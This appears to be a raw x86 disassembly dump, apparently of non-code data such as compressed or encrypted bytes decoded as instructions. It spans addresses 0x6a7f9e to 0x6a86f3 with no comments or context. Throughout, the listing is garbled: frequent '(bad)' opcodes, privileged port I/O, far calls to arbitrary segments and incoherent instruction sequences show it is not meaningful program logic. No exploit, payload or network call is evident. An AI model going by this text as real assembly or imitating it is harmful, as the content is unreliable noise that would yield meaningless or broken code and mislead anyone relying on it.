  6a7f9e:	shl    BYTE PTR [ebx+0x5c],0xc6
  6a7fa2:	js     0x6a800b
  6a7fa4:	cld    
  6a7fa5:	mov    ebx,0xc918a012
  6a7faa:	test   al,0xe0
  6a7fac:	fidivr WORD PTR [edi]
  6a7fae:	stc    
  6a7faf:	mov    bh,0xf3
  6a7fb1:	lock neg ebx
  6a7fb4:	add    eax,0xdcb510fe
  6a7fb9:	jle    0x6a7f86
  6a7fbb:	push   esp
  6a7fbc:	xor    edx,DWORD PTR [edi]
  6a7fbe:	(bad)  
  6a7fbf:	fnsave [eax+ebx*8]
  6a7fc2:	push   eax
  6a7fc3:	mov    dl,0xe0
  6a7fc5:	into   
  6a7fc6:	jns    0x6a7f7b
  6a7fc8:	out    dx,eax
  6a7fc9:	and    eax,0xb11b1154
  6a7fce:	adc    dl,0x8b
  6a7fd1:	sub    DWORD PTR [eax+0x1c],ebx
  6a7fd4:	inc    ecx
  6a7fd5:	push   ebx
  6a7fd6:	or     edx,eax
  6a7fd8:	mov    bh,0xc0
  6a7fda:	dec    ecx
  6a7fdb:	cmp    esi,DWORD PTR [edi-0x53]
  6a7fde:	jns    0x6a7fb7
  6a7fe0:	xor    al,BYTE PTR [ebx+edi*8+0x34cc4889]
  6a7fe7:	dec    eax
  6a7fe8:	fmulp  st(2),st
  6a7fea:	inc    ebx
  6a7feb:	icebp  
  6a7fec:	jbe    0x6a7f82
  6a7fee:	adc    eax,DWORD PTR ds:0xa5ffc9d
  6a7ff4:	sub    eax,0x518ff56
  6a7ff9:	xchg   ebp,eax
  6a7ffa:	aas    
  6a7ffb:	push   ds
  6a7ffc:	xchg   BYTE PTR [ebx],bl
  6a7ffe:	nop
  6a7fff:	lods   al,BYTE PTR ds:[esi]
  6a8000:	mov    dl,0xf
  6a8002:	inc    esp
  6a8003:	pop    ebp
  6a8004:	jbe    0x6a8010
  6a8006:	(bad)
  6a8009:	outs   dx,DWORD PTR ds:[esi]
  6a800a:	mov    ch,0xec
  6a800c:	dec    esi
  6a800d:	cmp    BYTE PTR [ebp+0x46],al
  6a8010:	dec    ecx
  6a8011:	mov    edi,0x58deb0b1
  6a8016:	xor    dh,BYTE PTR [edx-0x2f0fcecf]
  6a801c:	pop    eax
  6a801d:	test   bl,ch
  6a801f:	int3   
  6a8020:	sub    eax,esi
  6a8022:	sbb    BYTE PTR [edx+0x2a],cl
  6a8025:	shl    DWORD PTR [ebx],0x9f
  6a8028:	push   esi
  6a8029:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a802a:	and    esp,DWORD PTR [ebp-0x34]
  6a802d:	loopne 0x6a80ab
  6a802f:	jo     0x6a7ff2
  6a8031:	and    dl,dh
  6a8033:	sbb    ch,BYTE PTR [ebp+0x1]
  6a8036:	loop   0x6a8083
  6a8038:	cmp    ebx,DWORD PTR [ebx+0x7c]
  6a803b:	inc    esi
  6a803c:	sahf   
  6a803d:	ror    BYTE PTR [ecx+0xe085fe],cl
  6a8043:	xchg   edi,eax
  6a8044:	(bad)
  6a8049:	add    cl,BYTE PTR [eax+0x42]
  6a804c:	das    
  6a804d:	mov    edx,0x7de0dac4
  6a8052:	mov    bh,0xbb
  6a8054:	mov    al,0xa
  6a8056:	in     al,dx
  6a8057:	int    0x24
  6a8059:	(bad)  
  6a805a:	out    0x95,eax
  6a805c:	call   0xaa4d:0x19240c0b
  6a8063:	ja     0x6a80ae
  6a8065:	xchg   esi,eax
  6a8066:	adc    BYTE PTR [edx-0x3782a629],bh
  6a806c:	fldenv [ebp-0xc]
  6a806f:	add    BYTE PTR [ebx],cl
  6a8071:	outs   dx,DWORD PTR ds:[esi]
  6a8072:	jge    0x6a800f
  6a8074:	outs   dx,BYTE PTR ds:[esi]
  6a8075:	cwde   
  6a8076:	shr    DWORD PTR [ecx-0xc],0x29
  6a807a:	mov    ah,0xbf
  6a807c:	rcl    ebp,1
  6a807e:	int    0x4d
  6a8080:	dec    esi
  6a8081:	sub    eax,0xad37fb7b
  6a8086:	lock retf 
  6a8088:	(bad)  
  6a8089:	fist   WORD PTR gs:[ecx-0x7d12d7a0]
  6a8090:	jmp    0xd60f:0xb5b03be5
  6a8097:	in     al,0x66
  6a8099:	mov    bh,0xad
  6a809b:	hlt    
  6a809c:	mov    ebx,0x89159029
  6a80a1:	ja     0x6a8051
  6a80a3:	cdq    
  6a80a4:	in     eax,dx
  6a80a5:	retf   
  6a80a6:	in     al,dx
  6a80a7:	cmp    eax,0x8a41dee
  6a80ac:	sbb    bh,BYTE PTR [esp+ebx*2+0x2f]
  6a80b0:	xlat   BYTE PTR ds:[ebx]
  6a80b1:	fdiv   DWORD PTR [eax+0x1d69edae]
  6a80b7:	mov    esp,0xb0cdbf48
  6a80bc:	retf   0x4054
  6a80bf:	mov    ds:0x3f9ee8a,al
  6a80c4:	xor    eax,DWORD PTR [esi-0x80]
  6a80c7:	jmp    0xdc83d4c5
  6a80cc:	sbb    ebx,edi
  6a80ce:	xor    bl,BYTE PTR [esi-0x1a]
  6a80d1:	pop    ebx
  6a80d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a80d3:	(bad)  
  6a80d4:	xchg   ecx,eax
  6a80d5:	sub    dh,BYTE PTR [ebx-0x49]
  6a80d8:	push   esp
  6a80d9:	jns    0x6a8080
  6a80db:	call   0xc178:0xc3bccdef
  6a80e2:	dec    edx
  6a80e3:	mov    ds:0xf25db75a,al
  6a80e8:	and    al,0x37
  6a80ea:	xchg   edi,eax
  6a80eb:	scas   al,BYTE PTR es:[edi]
  6a80ec:	popf   
  6a80ed:	xor    al,0xb0
  6a80ef:	cmp    eax,0xa55e3a3d
  6a80f4:	cmp    al,0x33
  6a80f6:	loop   0x6a8176
  6a80f8:	shl    dh,cl
  6a80fa:	mov    bl,0x2
  6a80fc:	retf   0x308c
  6a80ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a8100:	es jne 0x6a80f2
  6a8103:	iret   
  6a8104:	push   esi
  6a8105:	add    cl,0xe
  6a8108:	ss test al,0x6
  6a810b:	push   eax
  6a810c:	jno    0x6a8121
  6a810e:	jae    0x6a80df
  6a8110:	cmp    eax,0xc2303fdb
  6a8115:	imul   esp,DWORD PTR [esi],0xe033f710
  6a811b:	loope  0x6a80f5
  6a811d:	cmp    BYTE PTR [ebx-0xdad79a4],0x3d
  6a8124:	jne    0x6a8134
  6a8126:	(bad)  [esi]
  6a8128:	imul   eax,DWORD PTR [esi-0x10776c75],0x89c5125e
  6a8132:	or     BYTE PTR [esi],bl
  6a8134:	mov    eax,ds:0xe00cd47c
  6a8139:	fs mov esi,0xf81fd518
  6a813f:	retf   
  6a8140:	sub    BYTE PTR [eax-0x4],bl
  6a8143:	and    eax,0xa8b552e1
  6a8148:	jnp    0x6a8191
  6a814a:	call   0xbb6a461
  6a814f:	push   eax
  6a8150:	sti    
  6a8151:	and    bl,ah
  6a8153:	cmp    al,bl
  6a8155:	add    eax,0x8847590d
  6a815a:	sub    DWORD PTR [ebx],ecx
  6a815c:	scas   eax,DWORD PTR es:[edi]
  6a815d:	leave  
  6a815e:	mov    edi,0x1b65dd06
  6a8163:	sub    BYTE PTR [ebx*8-0x63283455],dl
  6a816a:	push   ecx
  6a816b:	adc    cl,cl
  6a816d:	fimul  WORD PTR [esi]
  6a816f:	and    al,0xec
  6a8171:	xchg   edi,eax
  6a8172:	ins    DWORD PTR es:[edi],dx
  6a8173:	add    dl,dl
  6a8175:	push   0xfd127efb
  6a817a:	repz push ds
  6a817c:	out    0xc2,eax
  6a817e:	inc    edi
  6a817f:	mov    edx,0x54a98150
  6a8184:	gs xchg esp,eax
  6a8186:	sub    eax,0x48f9eefc
  6a818b:	jno    0x6a81cb
  6a818d:	mov    gs,WORD PTR [edx]
  6a818f:	out    0xa4,eax
  6a8191:	nop
  6a8192:	in     al,dx
  6a8193:	sbb    esp,DWORD PTR [ebx]
  6a8195:	push   ss
  6a8196:	sub    BYTE PTR [esi+0x118c5805],0x3c
  6a819d:	leave  
  6a819e:	xor    al,0x2a
  6a81a0:	push   esi
  6a81a1:	popf   
  6a81a2:	rcr    DWORD PTR [ecx-0x35],cl
  6a81a5:	ss enter 0xc635,0x74
  6a81aa:	adc    dh,bh
  6a81ac:	dec    ecx
  6a81ad:	lods   eax,DWORD PTR ds:[esi]
  6a81ae:	test   al,0xd
  6a81b0:	into   
  6a81b1:	pop    ebp
  6a81b2:	or     al,0xd5
  6a81b4:	xchg   edi,eax
  6a81b5:	inc    BYTE PTR [edx+0x6b96e154]
  6a81bb:	push   ds
  6a81bc:	dec    eax
  6a81bd:	or     al,0x1f
  6a81bf:	and    bl,ah
  6a81c1:	push   cs
  6a81c2:	mov    dl,al
  6a81c4:	mov    ebx,0xdf789355
  6a81c9:	sbb    ebx,DWORD PTR [edx]
  6a81cb:	lods   eax,DWORD PTR ds:[esi]
  6a81cc:	daa    
  6a81cd:	scas   eax,DWORD PTR es:[edi]
  6a81ce:	cld    
  6a81cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a81d0:	adc    ebp,DWORD PTR [edi+0x45]
  6a81d3:	not    BYTE PTR [ebx-0x15]
  6a81d6:	je     0x6a8164
  6a81d8:	loop   0x6a819c
  6a81da:	sub    ch,BYTE PTR [esi-0x3bfa6dc1]
  6a81e0:	test   al,0x20
  6a81e2:	test   DWORD PTR [ecx],esp
  6a81e4:	mov    eax,0xc7ca31dc
  6a81e9:	jnp    0x6a8229
  6a81eb:	(bad)  
  6a81ed:	mov    eax,0x3b053cd9
  6a81f2:	cmp    al,0x53
  6a81f4:	fsub   DWORD PTR ds:0x18c65412
  6a81fa:	mov    BYTE PTR [ecx+0x7f6a3a06],bh
  6a8200:	shl    ch,0xaf
  6a8203:	(bad)  
  6a8204:	mov    esi,0x39a6428
  6a8209:	jge    0x6a823a
  6a820b:	cmp    edx,DWORD PTR [edx+edx*4-0x381c132e]
  6a8212:	js     0x6a8288
  6a8214:	cwde   
  6a8215:	out    0x21,eax
  6a8217:	and    DWORD PTR [eax],esp
  6a8219:	fidiv  DWORD PTR [esi+0xd]
  6a821c:	push   0x329748ea
  6a8221:	jmp    0xd8ba583c
  6a8226:	jle    0x6a821b
  6a8228:	outs   dx,DWORD PTR ds:[esi]
  6a8229:	scas   al,BYTE PTR es:[edi]
  6a822a:	sbb    DWORD PTR [ebp+0x798c439c],edi
  6a8230:	jmp    0x6a8248
  6a8232:	sub    cl,bl
  6a8234:	mov    ecx,0x6747853e
  6a8239:	add    eax,0xcb94dbfd
  6a823e:	je     0x6a828f
  6a8240:	pop    esi
  6a8241:	mov    es,WORD PTR [esi]
  6a8243:	inc    esp
  6a8244:	or     eax,0x24a13b42
  6a8249:	push   0x39bbfe01
  6a824e:	test   al,0x4a
  6a8250:	mov    eax,es:0x30962c6f
  6a8256:	(bad)  
  6a8257:	sti    
  6a8258:	hlt    
  6a8259:	call   0x4a10aa54
  6a825e:	push   es
  6a825f:	dec    ecx
  6a8260:	jmp    0x6a82db
  6a8262:	jnp    0x6a820b
  6a8264:	mov    dh,0xb
  6a8266:	and    esi,esp
  6a8268:	les    esi,FWORD PTR [esi+0x9a20535]
  6a826e:	mov    al,ds:0xf78fc85b
  6a8273:	add    al,0xb4
  6a8275:	addr16 lahf 
  6a8277:	xor    ah,BYTE PTR [edx]
  6a8279:	ja     0x6a8299
  6a827b:	push   ebx
  6a827c:	sbb    dh,dh
  6a827e:	mov    bh,0xc7
  6a8280:	dec    ebp
  6a8281:	and    DWORD PTR [ecx+0x3a],ecx
  6a8284:	test   al,bh
  6a8286:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a8287:	imul   eax,DWORD PTR [edi+ecx*1+0x2d0d2637],0xc67cc028
  6a8292:	push   0xffffffed
  6a8294:	js     0x6a822a
  6a8296:	adc    BYTE PTR [eax],cl
  6a8298:	xchg   edi,eax
  6a8299:	aad    0x98
  6a829b:	and    dl,bh
  6a829d:	lds    esi,FWORD PTR [ecx+0x6b753101]
  6a82a3:	ins    BYTE PTR es:[edi],dx
  6a82a4:	sub    esi,DWORD PTR [eax]
  6a82a6:	jge    0x6a82a1
  6a82a8:	dec    ecx
  6a82a9:	or     BYTE PTR [esi-0x3583ccb],ch
  6a82af:	mov    dl,0x6d
  6a82b1:	ret    
  6a82b2:	jl     0x6a82ff
  6a82b4:	pop    edi
  6a82b5:	ret    0xaa2a
  6a82b8:	ds jnp 0x6a830d
  6a82bb:	int    0xbe
  6a82bd:	jae    0x6a82fc
  6a82bf:	out    dx,al
  6a82c0:	jno    0x6a82e4
  6a82c2:	scas   al,BYTE PTR es:[edi]
  6a82c3:	les    ecx,FWORD PTR ds:0x9321a76b
  6a82c9:	daa    
  6a82ca:	sbb    eax,0x27775cfa
  6a82cf:	mov    ds:0xd0a27352,al
  6a82d4:	xchg   esp,eax
  6a82d5:	add    esi,eax
  6a82d7:	mov    es,WORD PTR [ecx+ecx*4-0x2e]
  6a82db:	mov    dl,0x82
  6a82dd:	xchg   DWORD PTR [ebx],eax
  6a82df:	ins    DWORD PTR es:[edi],dx
  6a82e0:	or     al,0x73
  6a82e2:	(bad)  
  6a82e3:	int3   
  6a82e4:	shl    DWORD PTR [ecx-0x8757eaf],cl
  6a82ea:	in     eax,dx
  6a82eb:	loop   0x6a82d3
  6a82ed:	sbb    ecx,edx
  6a82ef:	loope  0x6a8303
  6a82f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a82f2:	mov    bh,0xab
  6a82f4:	push   ecx
  6a82f5:	imul   edi,ebp,0x4
  6a82f8:	sub    eax,esp
  6a82fa:	mov    dh,0xbf
  6a82fc:	push   ebx
  6a82fd:	inc    esp
  6a82fe:	dec    ebp
  6a82ff:	arpl   WORD PTR [esi],si
  6a8301:	call   0x2698:0xaf487baf
  6a8308:	in     eax,dx
  6a8309:	xor    BYTE PTR [eax-0x2c],0x92
  6a830d:	out    0x91,al
  6a830f:	call   0xdf33:0xd666cb7f
  6a8316:	call   0xc0ef0909
  6a831b:	stc    
  6a831c:	in     eax,0x1f
  6a831e:	ss lock popf 
  6a8321:	repnz cmp eax,edx
  6a8324:	sub    al,0x5d
  6a8326:	ret    
  6a8327:	je     0x6a837a
  6a8329:	call   0xf015:0x1d58fb6b
  6a8330:	mov    ecx,0x48e7017b
  6a8335:	add    DWORD PTR ds:0x11d2004d,edi
  6a833b:	aas    
  6a833c:	pop    esi
  6a833d:	hlt    
  6a833e:	add    edi,eax
  6a8340:	mov    edi,0xc37f4d74
  6a8345:	repnz push ss
  6a8347:	dec    edi
  6a8348:	iret   
  6a8349:	call   0x9736:0x402551bf
  6a8350:	or     DWORD PTR [edi+ebx*2-0x14],edx
  6a8354:	adc    BYTE PTR [ebx],ah
  6a8356:	sbb    DWORD PTR [esi],esi
  6a8358:	ins    BYTE PTR es:[edi],dx
  6a8359:	inc    esp
  6a835a:	mov    cl,0x84
  6a835c:	cmp    ecx,DWORD PTR [ebx+0x8cfd5cb]
  6a8362:	push   ds
  6a8363:	lods   al,BYTE PTR ds:[esi]
  6a8364:	dec    eax
  6a8365:	mov    fs:0x4badf4dc,al
  6a836b:	retf   0x6e33
  6a836e:	or     dl,bh
  6a8370:	dec    ebp
  6a8371:	jns    0x6a83a8
  6a8373:	or     eax,0x78565a2f
  6a8378:	jle    0x6a837c
  6a837a:	rol    DWORD PTR [edi],0x4
  6a837d:	retf   0xb08d
  6a8380:	popa   
  6a8381:	sub    edx,DWORD PTR [ebp+0xc883d3]
  6a8387:	test   BYTE PTR [ebx+0x1a8690d2],dh
  6a838d:	xchg   edx,eax
  6a838e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a838f:	sbb    BYTE PTR [ebp-0x7d02a2e5],ch
  6a8395:	or     eax,0xf4d8be76
  6a839a:	sub    BYTE PTR [esi+0x362d2965],0x77
  6a83a1:	xor    DWORD PTR [esi+ebx*8-0x53],0x4d
  6a83a6:	mov    ds:0x1ef05b23,al
  6a83ab:	and    BYTE PTR [ebx+0x4d],bh
  6a83ae:	gs scas al,BYTE PTR es:[edi]
  6a83b0:	mov    ebx,0x17074a87
  6a83b5:	push   ebx
  6a83b6:	xor    BYTE PTR gs:[esp+ebp*1+0x2eb4a1a9],al
  6a83be:	inc    esi
  6a83bf:	push   cs
  6a83c0:	inc    edi
  6a83c1:	sbb    BYTE PTR [ebp+0x74],bl
  6a83c4:	std    
  6a83c5:	sbb    ch,cl
  6a83c7:	shl    BYTE PTR [ebp+esi*4+0x26],0x8b
  6a83cc:	xchg   edi,eax
  6a83cd:	mov    eax,ds:0x34edfb53
  6a83d2:	and    eax,0x338fbb7f
  6a83d7:	push   edi
  6a83d8:	mov    ebp,edx
  6a83da:	xor    eax,0xa37371c0
  6a83df:	inc    edx
  6a83e0:	aad    0xd3
  6a83e2:	sub    ch,bl
  6a83e4:	mov    ebx,0xf188dfb7
  6a83e9:	mov    DWORD PTR [esi+0x14861e47],esi
  6a83ef:	aam    0xe1
  6a83f1:	cmp    esi,edx
  6a83f3:	(bad)  
  6a83f4:	xchg   esi,eax
  6a83f5:	fst    DWORD PTR [ecx-0x13]
  6a83f8:	popa   
  6a83f9:	xor    al,BYTE PTR [eax+0x1fa5b483]
  6a83ff:	push   eax
  6a8400:	jne    0x6a838f
  6a8402:	and    eax,ecx
  6a8404:	mov    DWORD PTR [ebx],ebp
  6a8406:	icebp  
  6a8407:	jae    0x6a83da
  6a8409:	data16 adc al,0x6
  6a840c:	xor    al,0x78
  6a840e:	and    eax,0x19bc6e03
  6a8413:	xchg   esp,eax
  6a8414:	mov    esi,edx
  6a8416:	sub    ebx,0xffffffb1
  6a8419:	stos   BYTE PTR es:[edi],al
  6a841a:	xchg   esi,eax
  6a841b:	pusha  
  6a841c:	stos   BYTE PTR es:[edi],al
  6a841d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a841e:	mov    al,ds:0x829da1e1
  6a8423:	inc    edi
  6a8424:	add    ah,dh
  6a8426:	mov    al,0x30
  6a8428:	pop    ecx
  6a8429:	mul    DWORD PTR [esi-0x34]
  6a842c:	adc    al,0xae
  6a842e:	adc    bl,BYTE PTR [esi+0x60c6472d]
  6a8434:	push   esp
  6a8435:	ret    0x851a
  6a8438:	stc    
  6a8439:	cmc    
  6a843a:	not    DWORD PTR [esi]
  6a843c:	or     al,0x9c
  6a843e:	fist   DWORD PTR [ebx-0x59]
  6a8441:	push   ecx
  6a8442:	sub    ecx,DWORD PTR ss:[ebp+0x31]
  6a8446:	cmp    ecx,edx
  6a8448:	idiv   DWORD PTR cs:[ebx]
  6a844b:	pop    ebp
  6a844c:	out    0xfe,eax
  6a844e:	add    DWORD PTR [edx-0x1a],0xd6d9ad8e
  6a8455:	pop    ds
  6a8456:	ficom  WORD PTR [edx]
  6a8458:	out    0x50,al
  6a845a:	sub    DWORD PTR [edi],edx
  6a845c:	lods   al,BYTE PTR ds:[esi]
  6a845d:	vcmpsd xmm2,xmm3,xmm4,0x77
  6a8462:	mov    ebp,0xcc2b913a
  6a8467:	scas   eax,DWORD PTR es:[edi]
  6a8468:	pop    ds
  6a8469:	ret    
  6a846a:	pop    ds
  6a846b:	xchg   esp,eax
  6a846c:	sbb    DWORD PTR [ebx],edi
  6a846e:	jmp    0x8c336884
  6a8473:	cli    
  6a8474:	sahf   
  6a8475:	fwait
  6a8476:	dec    edx
  6a8477:	push   ebp
  6a8478:	in     eax,0xff
  6a847a:	es inc ebp
  6a847c:	and    bh,BYTE PTR [ebx+ebx*2+0x43]
  6a8480:	and    edx,DWORD PTR [ebx+eiz*4]
  6a8483:	jmp    0x6a840f
  6a8485:	sub    ch,BYTE PTR [esi-0x2164fe2f]
  6a848b:	dec    eax
  6a848c:	std    
  6a848d:	and    eax,0x5ddf91d9
  6a8492:	push   ebx
  6a8493:	mov    al,0xd3
  6a8495:	or     eax,0x6fbad55
  6a849a:	loope  0x6a84f7
  6a849c:	mov    BYTE PTR [eax+0x1b],ch
  6a849f:	(bad)  
  6a84a0:	sub    DWORD PTR [esi],edi
  6a84a2:	icebp  
  6a84a3:	sbb    ebx,DWORD PTR [ecx-0x3881850d]
  6a84a9:	pop    esp
  6a84aa:	outs   dx,BYTE PTR ds:[esi]
  6a84ab:	cld    
  6a84ac:	and    eax,0x9fd1241e
  6a84b1:	or     esp,ebx
  6a84b3:	das    
  6a84b4:	fnsave fs:[ecx-0x34]
  6a84b8:	sub    edx,esi
  6a84ba:	xor    al,0x1c
  6a84bc:	mov    dh,0x36
  6a84be:	call   0x4276e351
  6a84c3:	add    edx,ebp
  6a84c5:	cdq    
  6a84c6:	test   al,0xe9
  6a84c8:	fstp   TBYTE PTR [edx+0x559ea1a7]
  6a84ce:	hlt    
  6a84cf:	out    dx,eax
  6a84d0:	das    
  6a84d1:	and    BYTE PTR fs:0xdcb6cbc,0x1
  6a84d9:	sbb    ch,BYTE PTR ds:[esi-0x6900e503]
  6a84e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a84e1:	imul   esi,DWORD PTR [edi+0xf],0xb814bfbf
  6a84e8:	pop    ecx
  6a84e9:	add    edx,DWORD PTR [edx-0x4a]
  6a84ec:	data16 jno 0x6a84cd
  6a84ef:	ss push edi
  6a84f1:	js     0x6a84f4
  6a84f3:	dec    edi
  6a84f4:	adc    eax,0x28f1cbbd
  6a84f9:	add    eax,0x2e312871
  6a84fe:	ds stos BYTE PTR es:[edi],al
  6a8500:	cmp    dl,BYTE PTR [edx+0x30]
  6a8503:	lock add eax,0xd38ca0c
  6a8509:	push   eax
  6a850a:	push   ds
  6a850b:	xor    edx,esp
  6a850d:	not    DWORD PTR [esi]
  6a850f:	aaa    
  6a8510:	rcr    BYTE PTR [ebp-0x14],cl
  6a8513:	hlt    
  6a8514:	stos   BYTE PTR es:[edi],al
  6a8515:	xchg   edi,eax
  6a8516:	add    ah,bl
  6a8518:	sbb    ebp,esi
  6a851a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a851b:	mov    dh,0x9b
  6a851d:	sahf   
  6a851e:	mov    ecx,0x497803d2
  6a8523:	push   esp
  6a8524:	call   0xd8d:0x4f4845eb
  6a852b:	outs   dx,DWORD PTR ds:[esi]
  6a852c:	cmc    
  6a852d:	test   DWORD PTR [eax+ecx*1],ebx
  6a8530:	mov    bh,0xf6
  6a8532:	adc    eax,0x53d33e08
  6a8537:	mov    dl,0xce
  6a8539:	xor    al,0xf9
  6a853b:	xor    al,0xf6
  6a853d:	and    eax,0x95f01bd0
  6a8542:	pusha  
  6a8543:	js     0x6a84e6
  6a8545:	pop    eax
  6a8546:	mov    WORD PTR [ebx+0xe],?
  6a8549:	sbb    BYTE PTR [ebx],al
  6a854b:	test   eax,0xff66e52f
  6a8550:	mov    esi,0xbfbc3a0e
  6a8555:	push   cs
  6a8556:	stc    
  6a8557:	cmp    dl,BYTE PTR [ebp-0x1e149ee2]
  6a855d:	dec    ebx
  6a855e:	xchg   edi,eax
  6a855f:	out    0x9f,eax
  6a8561:	sbb    ebx,DWORD PTR [edi]
  6a8563:	rol    DWORD PTR [esi],cl
  6a8565:	mov    WORD PTR [edi],ds
  6a8567:	int    0x5b
  6a8569:	xor    eax,0xb9ccb7c1
  6a856e:	dec    esi
  6a856f:	push   0xffffffa3
  6a8571:	dec    ecx
  6a8572:	jp     0x6a853d
  6a8574:	and    edx,edx
  6a8576:	lods   al,BYTE PTR ds:[esi]
  6a8577:	fldcw  WORD PTR [eax-0x62]
  6a857a:	nop
  6a857b:	mov    ah,BYTE PTR [edx-0x77]
  6a857e:	inc    edi
  6a857f:	iret   
  6a8580:	gs stos DWORD PTR es:[edi],eax
  6a8582:	add    al,0x8e
  6a8584:	retf   
  6a8585:	sahf   
  6a8586:	(bad)  
  6a8587:	out    dx,al
  6a8588:	inc    ebp
  6a8589:	adc    eax,0xe2a36893
  6a858e:	push   ebp
  6a858f:	mov    WORD PTR ds:[ecx+0x61028c0b],gs
  6a8596:	scas   al,BYTE PTR es:[edi]
  6a8597:	std    
  6a8598:	and    al,BYTE PTR [edx]
  6a859a:	mov    BYTE PTR [edx],al
  6a859c:	cli    
  6a859d:	push   es
  6a859e:	sub    dh,dh
  6a85a0:	push   ecx
  6a85a2:	pop    ss
  6a85a3:	mov    ds:0x3614b5,eax
  6a85a8:	push   ecx
  6a85a9:	mov    eax,ds:0x62c930d4
  6a85ae:	sbb    eax,DWORD PTR [ebx+0x526ce542]
  6a85b4:	pop    ss
  6a85b5:	dec    ecx
  6a85b6:	(bad)  
  6a85b8:	mov    ebx,0xa28f1c7a
  6a85bd:	and    BYTE PTR [edx],cl
  6a85bf:	inc    edx
  6a85c0:	outs   dx,DWORD PTR ds:[esi]
  6a85c1:	mov    cs,WORD PTR [ecx]
  6a85c3:	into   
  6a85c4:	inc    ebp
  6a85c5:	jl     0x6a85bf
  6a85c7:	mov    dh,0x77
  6a85c9:	inc    esp
  6a85ca:	ds mov dh,0x7d
  6a85cd:	mov    ebx,0x45158898
  6a85d2:	ret    0x24dc
  6a85d5:	sub    al,0x15
  6a85d7:	pop    edx
  6a85d8:	test   ch,ah
  6a85da:	inc    ecx
  6a85db:	xchg   edx,eax
  6a85dc:	shl    ebp,1
  6a85de:	test   al,0x18
  6a85e0:	(bad)  
  6a85e1:	out    dx,al
  6a85e2:	ret    
  6a85e3:	stos   DWORD PTR es:[edi],eax
  6a85e4:	add    ebx,DWORD PTR [esi]
  6a85e6:	shl    ecx,cl
  6a85e8:	jb     0x6a85c4
  6a85ea:	outs   dx,BYTE PTR ds:[esi]
  6a85eb:	push   ebp
  6a85ec:	xor    edx,ebx
  6a85ee:	fs and al,0xa2
  6a85f1:	sbb    al,0xab
  6a85f3:	test   eax,0xa4cc30cf
  6a85f8:	repz loopne 0x6a85b7
  6a85fb:	rcr    DWORD PTR [ecx],cl
  6a85fd:	sub    dh,BYTE PTR [ebp+0x53b56ab3]
  6a8603:	mov    edx,0x95dbe2fe
  6a8608:	(bad)  
  6a8609:	(bad)  
  6a860a:	jnp    0x6a8681
  6a860c:	dec    edi
  6a860d:	je     0x6a85eb
  6a860f:	sub    eax,0xefec293
  6a8614:	nop
  6a8615:	clc    
  6a8616:	mov    ch,0xe6
  6a8618:	add    edi,DWORD PTR [esi+0x14]
  6a861b:	sbb    esp,DWORD PTR [ebp-0x30]
  6a861e:	cdq    
  6a861f:	iret   
  6a8620:	fcomip st,st(0)
  6a8622:	dec    esp
  6a8623:	lahf   
  6a8624:	add    ch,BYTE PTR [ecx]
  6a8626:	out    0x2d,al
  6a8628:	(bad)  
  6a8629:	pop    edi
  6a862a:	mov    dh,0xe2
  6a862c:	int    0x5d
  6a862e:	dec    ecx
  6a862f:	call   0xaf710a1e
  6a8634:	jbe    0x6a85d1
  6a8636:	fstp   st(1)
  6a8638:	scas   eax,DWORD PTR es:[edi]
  6a8639:	or     esp,DWORD PTR [edi]
  6a863b:	dec    edi
  6a863c:	or     bl,BYTE PTR [esi]
  6a863e:	sbb    eax,0x10ad0ce1
  6a8643:	jge    0x6a864c
  6a8645:	iret   
  6a8646:	mov    bh,0x98
  6a8648:	(bad)  
  6a8649:	push   esp
  6a864a:	inc    ebp
  6a864b:	xor    eax,0x82431eda
  6a8650:	je     0x6a8688
  6a8652:	dec    edx
  6a8653:	cmp    DWORD PTR [esi-0x1a],esp
  6a8656:	push   eax
  6a8657:	xchg   DWORD PTR [eax],ecx
  6a8659:	jb     0x6a8676
  6a865b:	lods   al,BYTE PTR ds:[esi]
  6a865c:	pop    ss
  6a865d:	push   es
  6a865e:	sbb    esi,0x5b
  6a8661:	mov    cl,0xe
  6a8663:	mov    edi,0x15ffafaf
  6a8668:	and    al,0x1b
  6a866a:	in     eax,0x39
  6a866c:	mov    bh,0xf8
  6a866e:	rol    BYTE PTR ds:[ebp+0x3e],1
  6a8672:	adc    bh,BYTE PTR [edx+0x2703d604]
  6a8678:	push   cs
  6a8679:	rcl    DWORD PTR [edi],1
  6a867b:	cmp    ah,BYTE PTR [edx-0x6ef2c8ce]
  6a8681:	jl     0x6a8673
  6a8683:	sub    DWORD PTR [eax+0x63],0x60ac7766
  6a868a:	lea    esp,[eax-0x5]
  6a868d:	shr    esi,0xb5
  6a8690:	push   eax
  6a8691:	push   cs
  6a8692:	shl    DWORD PTR ds:0xed639b25,1
  6a8698:	push   0x39
  6a869a:	sbb    eax,0xb6c56b46
  6a869f:	rol    DWORD PTR [eax],cl
  6a86a1:	aam    0x9c
  6a86a3:	gs dec ecx
  6a86a5:	mov    eax,0x8dd697c5
  6a86aa:	vaddsubpd ymm1,ymm6,ymm1
  6a86ae:	add    BYTE PTR ds:0xeaec3c44,al
  6a86b4:	push   cs
  6a86b5:	gs mov edi,0x98b80314
  6a86bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a86bc:	jns    0x6a8682
  6a86be:	pop    ebp
  6a86bf:	ins    DWORD PTR es:[edi],dx
  6a86c0:	fidiv  WORD PTR [ebx-0x28e0f501]
  6a86c6:	lds    edx,FWORD PTR [edi+ebx*8+0x59]
  6a86ca:	cmp    BYTE PTR [edi],dh
  6a86cc:	lea    edx,[ecx+0x7b715971]
  6a86d2:	mov    ebp,0xa9ebd23d
  6a86d7:	mov    al,0x2f
  6a86d9:	pop    es
  6a86da:	push   gs
  6a86dc:	mov    al,ds:0x3a74f76d
  6a86e1:	push   ebx
  6a86e2:	mov    eax,gs
  6a86e4:	sub    cl,0xc8
  6a86e7:	mov    bh,0x1
  6a86e9:	jp     0x6a86a9
  6a86eb:	mov    esi,0xa8d23f21
  6a86f0:	ds or  dh,cl
  6a86f3:	mov    eax,ds:0x62e9c1d4
